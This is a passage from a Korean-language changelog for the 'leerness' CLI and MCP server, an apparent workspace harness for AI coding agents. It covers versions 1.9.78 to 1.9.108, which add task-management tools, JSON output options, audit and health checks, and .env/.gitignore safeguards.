- 새 명령: `leerness decision add "<title>" --reason "..." --alternatives "..." --impact "..."`
- decisions.md 에 표준 형식으로 자동 append:
  ```md
  ### YYYY-MM-DD — 결정 제목
  - Decision: 결정 제목
  - Reason: ...
  - Alternatives: ...
  - Impact: ...
  ```
- decisions.md 가 없으면 자동 생성.
- 1.9.43+ handoff lessons 자동 회수와 통합 — 추후 동일 키워드 작업 시 자동 재상기.

### Added — MCP 27번째 도구 `leerness_decision_add`
- 외부 AI(Claude Code / Hermes)가 설계 결정을 즉시 기록.
- 인자: `{ title (required), reason?, alternatives?, impact?, path? }`
- 사용 시나리오: 사용자와 토론 후 결정 사항을 외부 AI 가 자율 영구화.

### Memory Write Surface 시작
| 영역 | READ (기존) | WRITE (신규) |
|---|---|---|
| **Decisions** | lessons 자동 회수 (1.9.56+) | **`decision_add` (1.9.108)** |
| **Tasks** | task_export (1.9.60) | task_add/update/drop (1.9.105~107) |

다음 후보: lessons 직접 write, rules add, plan add 등.

### MCP 도구 수: 26 → 27개

### Verified
- stress-v53 — decision add CLI + decisions.md 실제 갱신 + MCP 응답 + 27 도구 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.107 — 2026-05-20

**MCP 26번째 도구 `leerness_task_drop` — task CRUD 완성** (read/add/update/drop 4종 surface).

### Added — MCP 26번째 도구 `leerness_task_drop`
- 외부 AI 가 task 를 `dropped` 상태로 폐기 (취소).
- 인자:
  - `id` (required) — 폐기할 task ID
  - `reason` — 폐기 사유 (기본 `사용자 요청으로 제외`)
  - `path` — 워크스페이스 경로

### MCP task CRUD 완성 (4종 surface)
| 라운드 | MCP 도구 | CRUD |
|---|---|---|
| 1.9.60 | `leerness_task_export` | **R**ead — task → TodoWrite JSON |
| 1.9.105 | `leerness_task_add` | **C**reate — 새 task 등록 |
| 1.9.106 | `leerness_task_update` | **U**pdate — 상태/evidence 갱신 |
| **1.9.107** | **`leerness_task_drop`** | **D**rop — 폐기 |

이제 외부 AI 가 task 전체 라이프사이클을 자율 관리 가능.

### MCP 도구 수: 25 → 26개

### Verified
- stress-v52 — MCP task_drop + CRUD 사이클 + 26 도구 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.106 — 2026-05-20

**MCP 25번째 도구 `leerness_task_update`** (read+add+update 3종 task 제어 surface 완성).

### Added — MCP 25번째 도구 `leerness_task_update`
- 외부 AI 가 기존 task 의 상태/evidence/nextAction 을 단계적으로 갱신.
- 인자:
  - `id` (required) — 갱신할 task ID (`T-XXXX`)
  - `status` — 9 status enum
  - `evidence` — evidence 라인 갱신
  - `nextAction` — 다음 액션 갱신
  - `note` — task request 텍스트 자체 변경
  - `path` — 워크스페이스 경로

### read+add+update 3종 task 제어 surface 완성
| 라운드 | MCP 도구 | 작업 |
|---|---|---|
| 1.9.60 | `leerness_task_export` | READ — task → TodoWrite JSON |
| 1.9.105 | `leerness_task_add` | ADD — 새 task 등록 |
| **1.9.106** | **`leerness_task_update`** | **UPDATE — 상태/evidence 갱신** |

외부 AI 가 작업 진행에 따라 task 를 add → update(in-progress) → update(done) 사이클로 자율 관리.

### MCP 도구 수: 24 → 25개

### Verified
- stress-v51 — MCP task_update + add→update 사이클 + 25 도구 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.105 — 2026-05-20

**MCP 24번째 도구 `leerness_task_add`** (외부 AI 가 task 즉시 등록 — 양방향 제어 완성).

### Added — MCP 24번째 도구 `leerness_task_add`
- 외부 AI(Claude Code / Hermes)가 progress-tracker.md 에 새 task 즉시 등록.
- 인자:
  - `text` (required) — task 설명
  - `status` — 9 status enum (requested/planned/in-progress/waiting/on-hold/blocked/incomplete/done/dropped). 기본 `requested`
  - `evidence` — evidence 라인 (기본 `user-request`)
  - `nextAction` — 다음 액션 (기본 `다음 액션 작성`)
  - `path` — 워크스페이스 경로 (기본 현재)
- 응답: 새 task ID (`T-XXXX`) + 성공 메시지
- 사용 시나리오: 사용자가 자연어로 "X 작업 추가해줘" → 외부 AI 가 즉시 `leerness_task_add` 호출.

### 양방향 제어 완성
- 1.9.60: `leerness_task_export` — task → TodoWrite (READ)
- **1.9.105: `leerness_task_add` — TodoWrite → task (WRITE)**
- 외부 AI 가 task 목록을 read + add 양방향 sync.

### MCP 도구 수: 23 → 24개
1~10 (기존) + skill_suggest / lessons / task_export / env_check / brainstorm / skill_match / skill_list / health / skill_search / skill_info / benchmark / lazy_detect / retro / **task_add** (1.9.105 신규)

### Verified
- stress-v50 — MCP task_add 응답 + progress-tracker.md 실제 갱신 + 24 도구 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.104 — 2026-05-20

**MCP 23번째 도구 `leerness_retro`** (4세션 누적 회고 외부 AI 노출).

### Added — MCP 23번째 도구 `leerness_retro`
- 4세션 누적 회고 보고서 JSON 외부 AI 노출.
- 인자: `{ path?, days?, allApps? }`
- 출력 데이터: `statusCounts` / `focusNext` / `skillUsage` / `recentDecisions` / `durations` / `activeRules` / `verifiedRules` / `fixSignals` / `passSignals` / `totalOptimizations`
- `retro` CLI 명령은 1.9.16부터 `--json` 지원했으나, MCP 노출은 1.9.104에서 추가.
- 사용 시나리오: 외부 AI가 누적 패턴 학습 / 다음 라운드 우선순위 결정 / 디버그 비중 분석.

### MCP 도구 수: 22 → 23개
1~10 (기존) + skill_suggest / lessons / task_export / env_check / brainstorm / skill_match / skill_list / health / skill_search / skill_info / benchmark / lazy_detect / **retro** (1.9.104 신규)

### Verified
- stress-v49 — MCP retro 응답 + 23 도구 노출 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.103 — 2026-05-20

**`leerness session close --json`** (세션 마감 통계 JSON + MCP `leerness_session_close` JSON 자동).

### Added — `leerness session close [path] --json`
- 출력: `{ version, root, closedAt, sessionNumber, taskCounts, recommendedDirection, nextExactStep, rules[], skillCandidates[], drift, topCommands[], mcpStats, workspacePeers, retroSummaryError? }`
- `taskCounts`: 9개 status (requested/planned/in-progress/waiting/on-hold/blocked/incomplete/done/dropped) 카운트
- `rules`: 활성 룰 검증 결과 (id/trigger/verified/note)
- `skillCandidates`: Hermes-style 자동 학습 (top 5)
- `drift`: { level, score, fired[] }
- `topCommands`: 가장 많이 쓴 명령 top 3
- `mcpStats`: { total, top[], rare[] }
- `workspacePeers`: 다른 leerness 프로젝트 개수
- stdout 억제 후 JSON만 (CI/외부 AI 통합 친화)

### Changed — MCP `leerness_session_close`
- 기본 응답을 **JSON** 으로 변경 (--json 자동 전달).
- 외부 AI(Claude Code / Hermes)가 마감 시 통계를 파싱 친화적으로 회수.

### JSON 옵션 누적 13종
`skill list/info/search` · `health` · `lessons` · `handoff` · `env check` · `benchmark` · `drift check` · `lazy detect` · `usage stats` · `audit` · **`session close`** (신규)

### Verified
- stress-v48 — session close --json 구조 + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.102 — 2026-05-20

**`leerness audit --json` 구조화 출력** (findings 11종 kind + MCP `leerness_audit` JSON 응답).

### Added — `leerness audit [path] --json`
- 출력: `{ version, root, warnings, failures, fixed, healthy, fixApplied, strict, strictThreshold, summary, findings[] }`
- 각 finding: `{ kind, severity, message, ...details }`
- **finding.kind 11종**:
  - `design_dup` — design guide 중복 파일 (`docs/designguide.md` 등)
  - `design_system_default` — design-system.md tokens not customized
  - `reuse_map_empty` — reuse-map.md 비어있음
  - `milestone_unlinked` — milestone progress-tracker 미연결
  - `handoff_not_generated` — session-handoff.md never auto-generated
  - `current_state_stale` — current-state.md 7일 이상 stale
  - `readme_version_mismatch` — README 배지 ↔ package.json 불일치
  - `npm_cve` — npm audit 발견 CVE
  - `npm_cve_critical` — critical/high CVE 즉시 대응 권장
  - `gitignore_missing_secrets` — .gitignore에 시크릿 패턴 누락
  - `env_keys_missing` — .env 키가 .env.example에 누락
  - `strict_promoted` — --strict로 warnings → failures 승격
- exit 1 if `failures > 0` (warnings 만으로는 healthy=true 유지)
- 기존 verbose 출력은 stdout 억제 후 JSON만 출력 (CI 친화)

### Changed — MCP `leerness_audit`
- 기본 응답을 JSON 으로 변경 (--json 자동 전달).
- `args.strict: true` 옵션 추가 → `--strict` 전달.
- 외부 AI(Claude Code / Hermes)가 audit 결과를 파싱 친화적으로 받음.

### JSON 옵션 통합 11종 (1.9.102 까지)
| 명령 | 라운드 | 핵심 |
|---|---|---|
| `skill list --json` | 1.9.84 | items[] |
| `health --json` | 1.9.85 | checks/issues/healthy |
| `skill search --json` | 1.9.90 | matches[] |
| `skill info --json` | 1.9.92 | 개별 skill |
| `lessons --json` | 1.9.95 | lessons[] |
| `handoff --json` | 1.9.96 | files{...}/activeRules |
| `env check --json` | 1.9.71 | inEnvOnly/inExampleOnly |
| `benchmark --json` | 1.9.46 | 6 차원 점수 |
| `drift check --json` | (기존) | score/level/fired[] |
| `lazy detect --json` | 1.9.101 | findings[] 7 kind |
| `audit --json` | **1.9.102** | **findings[] 11 kind** |

### Verified
- stress-v47 — audit --json 구조 + 11 kind 검출 + MCP audit + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.101 — 2026-05-20

**`leerness lazy detect --json` + MCP 22번째 도구 `leerness_lazy_detect`** (외부 AI에 거짓 완료/empty handoff/no test run/TODO 미추적 신호 노출).

### Added — `leerness lazy detect [path] --json`
- 기존 `lazy detect` 명령에 `--json` 옵션 추가.
- 출력: `{ version, root, issues, healthy, todoCount, newTodoCount, findings[] }`
- 각 finding: `{ kind, severity, ...details }`
  - `kind` 종류: `evidence_missing` / `progress_empty` / `handoff_never_generated` / `handoff_empty` / `no_test_run` / `todo_untracked` / `blocker_no_next_action`
- exit 1 if `issues > 0` (CI 통합 친화적)

### Added — MCP 22번째 도구 `leerness_lazy_detect`
- 외부 AI가 워크스페이스의 거짓 완료/lazy 신호를 JSON으로 사전 점검.
- 사용 시나리오: 세션 마감 전 자동 검사, CI 게이트, AI 에이전트의 "정말 끝났는지" self-check.
- MCP 도구 수: **21 → 22개**.

### Verified
- stress-v46 — lazy detect --json 구조 + 7종 kind 검출 + MCP 22 도구 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.100 — 2026-05-20 🏆 마일스톤 (30 라운드 자율 누적 + 100번째 패치)

**1.9.70 ~ 1.9.99 자율 모드 30 라운드 누적 마일스톤** (stress-v45 30/30 PASS · e2e 219/219 PASS).

### Milestone Summary
- **버전 진화**: 1.9.70 → 1.9.100 (30 라운드, 모두 stress + e2e + GitHub release)
- **MCP 도구**: 12 → **21개** (env_check / brainstorm / skill_match / skill_list / health / skill_search / skill_info / benchmark 추가)
- **handoff 자동 회수 5단**: lessons + skill 추천 + history hit + brainstorm hits + 헤드라인
- **3중 보안 가드**: drift 5번째 신호 (1.9.78) + handoff 요약 (1.9.76) + CRITICAL 자동 회복 (1.9.80)
- **JSON 옵션 10종**: handoff, lessons, skill list/info/search, health, env check, benchmark, drift check, usage stats
- **새 명령 3종**: `env check/sync` (1.9.71) · `health` (1.9.85) · `skill search` (1.9.90)
- **handoff --quiet** (1.9.99) — 자동화/CI 비대화 모드

### Verified — stress-v45 종합 검증 (1.9.70~99 30 라운드)
- **총 30 / PASS 30 / FAIL 0 · 34015ms** (100% 통과)
- R70~R99 핵심 기능 시나리오 28개 + MCP 21 도구 + 5종 시크릿 패턴 안전 검증
- e2e 219/219 PASS 매 라운드 유지
- 누적 회귀 0건, 신규 회귀 없음

### Internal — 비공개 종합 보고서
- `_reports/AUTONOMOUS_ROUNDS_1.9.70-1.9.99.md` — 30 라운드 자율 모드 누적 + 마일스톤 마무리

### Stats (30 라운드 누적)
- stress 시나리오 ~440개 모두 PASS
- 디버그 기록 6건 (1차 실패 → 진단 → 수정 → PASS)
- GitHub release/tag 30개 (v1.9.70 ~ v1.9.99 + v1.9.100)
- 사용자 명시 정책 7개 모두 ✓

### 사용자 명시 정책 준수 (verbatim)
- ✓ 매 라운드 stress test 필수 검수
- ✓ 이전 중요 기능 정상 작동 검증 (누적 회귀)
- ✓ 성능 테스트 병행 (handoff median ~700ms 유지)
- ✓ GitHub 배포 (https://github.com/gugu9999gu/leerness)
- ✓ `_reports/` 비공개 (`.gitignore` + `.npmignore`)
- ✓ 설치 가이드 매 라운드 동기화 (`_banner` quickStart + `session-workflow.md`)
- ✓ 보안: `.env` 실제 값 절대 미노출, 시크릿 하드코딩 차단

---

## 1.9.99 — 2026-05-20

**`leerness handoff --quiet` 옵션** (자동화/CI 모드용 최소 출력).

### Added
- `leerness handoff --quiet` — 자동 회수 라인 모두 비활성화:
  - 헤드라인 (1.9.81/93)
  - lessons 자동 재상기 (1.9.56)
  - 매칭 skill 자동 추천 (1.9.67)
  - skill match 이력 (1.9.69)
  - brainstorm 자동 hits (1.9.88)
  - 보안 요약 (1.9.76) / CRITICAL (1.9.80)
- 기본 컨텍스트 (Session Handoff, Plan, Progress Tracker, Decisions, Task Log)만 출력.
- CI 통합 / 자동 처리 / 비대화형 환경에 적합.

### Verified
- stress-v44 — quiet 모드 출력 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.98 — 2026-05-20

**`leerness skill publish` 보안 사전 점검 통합** (사용자 글로벌 룰 보안 정책 자동화).

### Added — publish 보안 사전 점검
- `leerness skill publish` 명령 실행 전 `leerness health` 자동 호출.
- `issues.length > 0` 시 publish 중단 + exit 1:
  - 🚨 보안 사전 점검 (1.9.98): N건 issue 발견
  - 권장: `leerness audit --fix`
  - 우회: `--force` 또는 `--no-security-check`
- 통과 시: `✓ 보안 사전 점검 (1.9.98): 통과` 후 정상 publish

### Use Case
- 사용자가 `.env` 가 `.gitignore` 에 없는 상태에서 skill publish 시도 → 자동 차단.
- 시크릿 노출 사고 사전 방지.
- CI 통합 시 더욱 안전.

### Verified
- stress-v43 — publish 보안 사전 점검 + --force 우회 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.97 — 2026-05-20

**자율 모드 27 라운드 종합 보고서 갱신 + 마무리** (1.9.70 ~ 1.9.96).

### Internal — 비공개 종합 보고서
- `_reports/AUTONOMOUS_ROUNDS_1.9.70-1.9.96.md` 갱신 (이전 1.9.89 보고서 확장)
- 27 라운드 전체 요약 + 그룹화 (보안 / MCP 21개 / handoff 5단 / JSON 옵션 9종)
- 성능 측정 (handoff 700ms · health 720ms · audit 350ms · drift 400ms)
- 디버그 기록 6건
- 사용자 명시 정책 7개 모두 ✓

### Stats
- 자율 모드 27 라운드 (1.9.70 ~ 1.9.96)
- MCP 도구: 12 → 21개
- 새 명령: env check/sync, health, skill search
- JSON 옵션: 9종 (handoff, lessons, skill list/info/search, health, env check, benchmark, drift check)

### Verified
- e2e 219/219 매 라운드 PASS 유지

---

## 1.9.96 — 2026-05-20

**`leerness handoff --json` 옵션 추가** (외부 AI / MCP 통합용).

### Added
- `leerness handoff --json` — 구조화된 JSON 출력
  - `{ date, project, version, files: { sessionHandoff, currentState, plan, progressTracker, decisions, taskLog }, activeRules?: [...] }`
  - 각 file: `{ path, content }` (8000자 초과 시 truncated)
- 자동 회수 라인 (lessons / skill 추천 / history / brainstorm / 헤드라인)은 일반 모드에서만.
- 외부 AI(Claude Code, Cursor)가 handoff 데이터를 파싱 친화적으로 받음.

### Verified
- stress-v42 — handoff --json + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.95 — 2026-05-20

**`leerness lessons --json` 옵션 + MCP leerness_lessons 자동 JSON 응답**.

### Added
- `leerness lessons --json` 옵션:
  - `{ query, total, lessons[]: { source, title, preview, truncated } }`
- MCP `leerness_lessons` 도구가 자동으로 `--json` 적용 → 구조화 응답.
- 외부 AI(Claude Code, Cursor)가 lessons 결과를 파싱 친화적으로 받음.

### Verified
- stress-v41 — lessons --json + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.94 — 2026-05-20

**MCP server 21번째 도구 `leerness_benchmark`** (1.9.46/51 benchmark 외부 노출).

### Added — MCP 21번째 도구
- `leerness_benchmark` — 1.9.46 6 차원 점수 + 1.9.51 검수 시나리오 결과를 외부 AI에 노출.
  - inputSchema: `{ path: string, scenario: string (optional) }`
  - 응답: benchmark --json 결과
    - `scenario` 없으면: `{ project, measured, leernessScore, total, compareSimulated }`
    - `scenario: 'all'` 등: `{ scenarios: [...], detectedCount, total }`
- benchmark --json 옵션은 이미 존재 (1.9.46/51) — MCP 노출만 추가.
- MCP server 도구 카운트: **20 → 21**.

### Verified
- stress-v40 — MCP 21 도구 + benchmark 호출 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.93 — 2026-05-20

**handoff 헤드라인에 health 종합 상태 1 토큰 추가** (1.9.81 + 1.9.85 통합).

### Improved — 헤드라인 health 토큰
- 1.9.81 통합 헤드라인 끝에 `⚕ health: ✓` 또는 `⚕ health: ⚠` 1 토큰 추가.
- inline 추론 (자식 spawn 없음, 성능 비용 최소):
  - `.env` 가 `.gitignore` 에 포함되면 ✓
  - 누락이면 ⚠
- 헤드라인 라벨도 `(1.9.81/93)` 으로 갱신.
- 예:
  ```
  📊 헤드라인 (1.9.81/93): drift healthy (0) · 📚 9 skills · ⚕ health: ✓
  📊 헤드라인 (1.9.81/93): drift attention (45) · 🚨 보안 위험 · 📚 9 skills · ⚕ health: ⚠
  ```

### Use Case
- AI 에이전트가 handoff 1줄로 워크스페이스 헬스 즉시 인지 (별도 `leerness health` 호출 불필요).

### Verified
- stress-v39 — health 토큰 노출 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.92 — 2026-05-20

**`skill info --json` + MCP 20번째 도구 `leerness_skill_info`**.

### Added
- `leerness skill info <id> --json` 옵션 신규 추가 (CI 친화 + MCP 통합 기반).
  - 출력 필드: id / displayNameKo / source / version / lastUpdated / verification / usage / capabilities / sources / patterns / optimizations
- **MCP 20번째 도구** `leerness_skill_info`:
  - inputSchema: `{ id: string (required), path: string }`
  - 외부 AI가 개별 skill의 능력/사용 이력/패턴 정확 파악.
- MCP server 도구 카운트: **19 → 20**.

### Verified
- stress-v38 — skill info --json + MCP 20 도구 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.91 — 2026-05-20

**MCP server 19번째 도구 `leerness_skill_search`** (1.9.90 외부 AI 노출).

### Added — MCP 19번째 도구
- `leerness_skill_search` — 1.9.90 skill search 명령을 외부 AI에 노출.
  - inputSchema: `{ capability: string (required), path: string }`
  - 응답: `skill search --json` 결과
- 외부 AI가 capability 키워드로 사용 가능한 skill 직접 검색.
- MCP server 도구 카운트: **18 → 19**.

### Verified
- stress-v37 — MCP 19 도구 + skill_search 호출 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.90 — 2026-05-20

**`leerness skill search <capability>` 새 명령** — capability 배열 부분 일치 검색.

### Added — `leerness skill search`
- `leerness skill search "<capability>"` — capability 키워드로 skill 검색.
  - substring + case-insensitive 매칭.
  - `--json`: 구조화 출력 (`{ query, total, matches[] }`).
- skill match (jaccard 점수 매칭)과 다름:
  - `skill match`: 자연어 task → 점수 기반 추천
  - `skill search`: capability 필드에 정확히 키워드 포함된 skill만
- 예:
  ```
  leerness skill search "API"   → commerce-api
  leerness skill search "검증"  → firebase, ai-verified-skill-publisher
  ```

### Use Case
- "내가 이 능력을 가진 skill을 찾고 싶다" 명확한 의도에 사용.
- skill match가 너무 광범위할 때 capability로 좁히기.

### Verified
- stress-v36 — search 명령 + 부분 일치 + --json + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.89 — 2026-05-20

**자율 모드 19 라운드 종합 검증 + 마무리** (1.9.70 ~ 1.9.88).

### Verified — stress-v35 24/24 PASS
- 19 라운드 모든 핵심 기능 (R70~R88) 개별 검증
- MCP server 18 도구 노출 확인
- 성능 종합 측정:
  - handoff (전체 통합) **692ms** / health **689ms** / audit 345ms / drift check 383ms
  - 누적에도 회귀 없음 (절대 임계 모두 통과)

### Internal — 종합 보고서
- `_reports/AUTONOMOUS_ROUNDS_1.9.70-1.9.88.md` (비공개, 사용자 검토용)
- 19 라운드 그룹화: 보안 라인 / MCP 도구 / 학습·회고 / handoff 5단 통합
- 디버그 기록 6건 (모두 진단 + 수정 후 PASS)

### e2e
- **219/219 PASS** 유지

---

## 1.9.88 — 2026-05-20

**`handoff`에 brainstorm 자동 hits 노출** (1.9.72 brainstorm 통합).

### Added — handoff 자동 brainstorm hits
- handoff 자동 skill 추천 (1.9.67) + history hit (1.9.69) 블록 끝에 추가:
  - **🧩 brainstorm 자동 hits (1.9.88)** — 현재 task 키워드로 자동 호출
  - 미리보기 1줄씩: `💭 decisions` / `⚠ lessons` / `📜 task-log fail` / `📚 skill`
  - 최대 4건 노출.
- 모든 데이터 없으면 출력 안 함 (잡음 방지).
- 끄기: `--no-brainstorm-hits` 또는 `LEERNESS_NO_BRAINSTORM_HITS=1`.

### Use Case
- AI 에이전트가 세션 시작 시 같은 주제 과거 결정/실패/skill을 즉시 인지.
- "같은 키워드로 어떤 결정을 내렸지?" "어떤 실패가 있었지?" "어떤 skill 썼지?" 한 줄씩 자동 회수.

### Verified
- stress-v34 — handoff brainstorm hits 노출 + --no-brainstorm-hits + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.87 — 2026-05-20

**`session-workflow.md` 템플릿에 1.9.69~86 누적 신규 기능 안내 추가** (init 가이드 정확성).

### Updated
- `init` 시 생성되는 `.harness/session-workflow.md` 템플릿 갱신:
  - `📊 빠른 체크리스트` — `leerness health` / `.env` ↔ `.env.example` / `LEERNESS_AUTO_SECURITY_FIX` 라인 추가.
  - 안내 라인 7개 추가:
    - 1.9.69+ handoff history hit
    - 1.9.76+ handoff 보안 요약
    - 1.9.80+ CRITICAL + 자동 회복
    - 1.9.81+ 통합 헤드라인
    - 1.9.85+ `leerness health` 종합 점검
    - 1.9.78/82+ drift `--auto-fix` 보안 회복
    - 1.9.86+ MCP **18 도구** 목록
- AI 에이전트가 `init` 직후 곧바로 최신 워크플로 인지 가능.

### Verified
- stress-v33 — session-workflow.md 안내 포함 확인 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.86 — 2026-05-20

**MCP server 18번째 도구 `leerness_health` 추가** (1.9.85 health 외부 AI 노출).

### Added — MCP 18번째 도구
- `leerness_health` — 1.9.85 종합 헬스 체크를 외부 AI에 노출.
  - inputSchema: `{ path: string, strict: boolean }`
  - 응답: `health --json` 결과 (drift + security + skills + usage + tasks + issues)
  - 외부 AI가 워크스페이스 상태 한 번에 인지.
- MCP server 도구 카운트: **17 → 18**.

### Use Case
- Claude Code / Cursor가 사용자 워크스페이스에서 작업 시작 시 → `leerness_health` 호출 → drift/보안/skill/MCP 상태 즉시 파악 → 적절한 행동 결정.
- "이 워크스페이스 보안 안전한가?" "어떤 skill 있나?" "MCP 호출 패턴은?" 한 호출로 답변.

### Verified
- stress-v32 — MCP 18 도구 + health 호출 + JSON 응답 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.85 — 2026-05-20

**`leerness health` 새 명령** — 종합 헬스 체크 (drift + 보안 + skill + MCP + 누적 통계).

### Added — `leerness health [<path>]`
- 종합 진단 한 번에:
  - `drift`: level + score + fired 개수
  - `보안`: .env 존재 / .gitignore에 .env 포함 / .env.example 누락 키 / .gitignore 시크릿 패턴 누락
  - `skills`: 설치 수 / skill query 누적 (rolling history)
  - `usage`: 명령 호출 총수 + 종류 / MCP 호출 총수 + 종류 / since
  - `tasks`: progress-tracker 총수 + 상태별 카운트
- **`issues`** 배열에 발견된 모든 문제 자동 집계.
- `--json`: 구조화된 JSON 출력 (CI 친화).
- `--strict`: issue ≥ 1 시 exit 1.

### Use Case
- 사용자: `leerness health .` 한 줄로 워크스페이스 전체 상태 즉시 확인.
- CI 통합: `leerness health . --strict` 로 보안/drift 문제 자동 감지.
- 1.9.78 drift + 1.9.75/76/80 보안 + 1.9.70 MCP 통계 + 1.9.79 skill suggest의 모든 신호를 한 곳에 집계.

### Verified
- stress-v31 — health 출력 / --json / --strict / 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.84 — 2026-05-20

**MCP server 17번째 도구 `leerness_skill_list` 추가** (외부 AI에 skill 목록 조회 노출).

### Added — MCP 17번째 도구
- `leerness_skill_list` — 워크스페이스에 설치된 skill 목록 조회.
  - inputSchema: `{ path: string }`
  - 응답: `skill list --json` 결과 (skillpack 출처 + items 배열: id/displayNameKo/source/capabilities/usageCount/lastUsed/lastUpdated)
  - 외부 AI가 사용 가능한 skill을 즉시 인지하여 적절한 능력 활용.
- `skill list --json` 옵션 신규 추가 (CI 친화).
- MCP server 도구 카운트: **16 → 17**.

### Use Case
- Claude Code / Cursor 가 작업 시작 시 → `leerness_skill_list` 호출 → 사용 가능한 skill 카탈로그 파악 → 적절한 능력 활용.
- skill_match와 결합: "이 task에 매칭되는 skill (skill_match) + 전체 skill 카탈로그 (skill_list)" 양방향 활용.

### Verified
- stress-v30 — MCP 17 도구 + skill_list 호출 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.83 — 2026-05-20

**MCP server 16번째 도구 `leerness_skill_match` 추가** (1.9.45/50/68 skill match 외부 노출).

### Added — MCP 16번째 도구
- `leerness_skill_match` — 사용자 task 키워드에 매칭되는 설치된 skill 추천.
  - inputSchema: `{ query: string (required), path: string, useEmbedding: boolean }`
  - 응답: `skill match --json` 결과 (query / total / matched / top[].id/name/description/score)
  - 1.9.68 rolling history 자동 누적 (`.harness/skill-suggestions.md`)
  - 1.9.79 skill suggest 알고리즘에 자동 누적된 query 반영 가능
- MCP server 도구 카운트: **15 → 16**.

### Verified
- stress-v29 — MCP 16 도구 + skill_match 호출 + rolling history 누적 + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.82 — 2026-05-20

**`drift check --auto-fix` 에 보안 회복 통합** (1.9.78 + 1.9.75 audit --fix 결합).

### Added — drift --auto-fix 보안 자동 회복
- 1.9.39 `drift check --auto-fix` 확장:
  - 기존: critical level 시 `session close` 자동 실행.
  - **신규 (1.9.82)**: 보안 신호 (1.9.78) 발견 시 **우선 `audit --fix` 자동 실행** → `.gitignore` + `.env.example` 동기화 → 재검사.
- 호출 순서:
  1. drift 신호 평가 (5개)
  2. 보안 신호 fired → `audit --fix` 자동 실행 + 재귀 재검사
  3. (보안 없는 critical) → `session close` 자동 실행 + 재귀 재검사
- AI 에이전트가 `drift check --auto-fix` 한 번으로 보안 + 세션 마감 둘 다 자동 회복.

### Verified
- stress-v28 — drift --auto-fix 보안 회복 / 재검사 후 안정화 / 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.81 — 2026-05-20

**`handoff` "통합 헤드라인" 한 줄 요약** (drift + 보안 + skill + MCP).

### Added — handoff 헤드라인
- Date / Project 라인 직후에 한 줄 요약 자동 노출:
  ```
  📊 헤드라인 (1.9.81): drift healthy (0) · 🔒 보안 OK · 🔌 MCP 8회 · 📒 skill query 4회 · 📚 12 skills
  ```
- 표시 요소:
  - `drift <level> (<score>)` — 1.9.78 5신호 결과
  - `🔒 보안 OK` 또는 `🚨 보안 위험` — 1.9.76 보안 요약 압축
  - `🔌 MCP N회` — 1.9.70 MCP 누적 카운트
  - `📒 skill query N회` — 1.9.68 rolling history 누적
  - `📚 N skills` — 설치된 skill 총 수
- 데이터 없는 항목은 자동 생략 (잡음 방지).
- 끄기: `--no-headline` 또는 `--compact`.

### Use Case
- AI 에이전트가 한 줄로 워크스페이스 상태 즉시 인지 → "drift attention인데 MCP 0회면 도구 안 쓰고 있다" 같은 빠른 판단.

### Verified
- stress-v27 — 헤드라인 노출 / --no-headline / 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.80 — 2026-05-20

**handoff에서 `.env` 보안 critical 시 자동 회복 옵션** (1.9.76 보안 요약 + 1.9.75 audit --fix 결합).

### Added — 보안 critical 자동 회복
- 1.9.76 handoff 보안 요약 블록 확장:
  - `.env` 가 `.gitignore` 에 없으면 **🚨 CRITICAL** 경고.
  - 즉시 `leerness audit --fix` 권장 안내.
- **자동 실행 옵션**: `LEERNESS_AUTO_SECURITY_FIX=1` 환경변수 활성 시 handoff에서 `audit --fix` 자동 실행.
  - 시크릿 노출 위험 즉시 회복.
  - 성공 시 `✓ 자동 회복 (LEERNESS_AUTO_SECURITY_FIX=1)` 메시지.

### Use Case
- 사용자가 `.env` 를 무심코 만들었지만 `.gitignore` 에 추가 안 한 상태 → 다음 handoff에서 즉시 인지 + 옵션 활성 시 자동 회복.
- 1.9.78 drift 보안 신호 + 1.9.76 handoff 요약 + 1.9.80 자동 회복 = **3중 보안 가드** 완성.

### Verified
- stress-v26 — handoff CRITICAL 메시지 / 자동 회복 / 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.79 — 2026-05-20

**`leerness skill suggest` 알고리즘 강화** (1.9.68 rolling history 빈도 활용 — Hermes-style 학습 신호 보강).

### Improved — skill suggest 학습 신호 확장
- 기존 신호 (1.9.53): task-log.md / progress-tracker.md / usage-stats.commands.
- **추가 신호 (1.9.79)**: `.harness/skill-suggestions.md` rolling history 빈도.
  - 같은 키워드를 2회 이상 `skill match`로 검색했다면 **학습 신호로 가중** (×2).
  - 예: 사용자가 "payment 결제 자동화" 를 3번 검색 → keyword "payment" 의 score `+6`.
  - 출처: `progress+history` 로 표시 + `historyHits` 필드 노출.
- 후보 점수 = task-log 매치 + progress 토큰 매치 + usage 카운트 + **history 빈도 × 2**.

### Use Case
- AI 에이전트가 반복적으로 같은 주제를 검색했다면 → **이 주제는 신규 skill로 등록할 가치가 큼** 자동 식별.
- Hermes-style 자동 학습 강화 (`leerness skill learn` 권장 정확도 향상).

### Verified
- stress-v25 — history 가중 + 누적 회귀 + 성능.
- e2e 219/219 PASS 유지.

---

## 1.9.78 — 2026-05-20

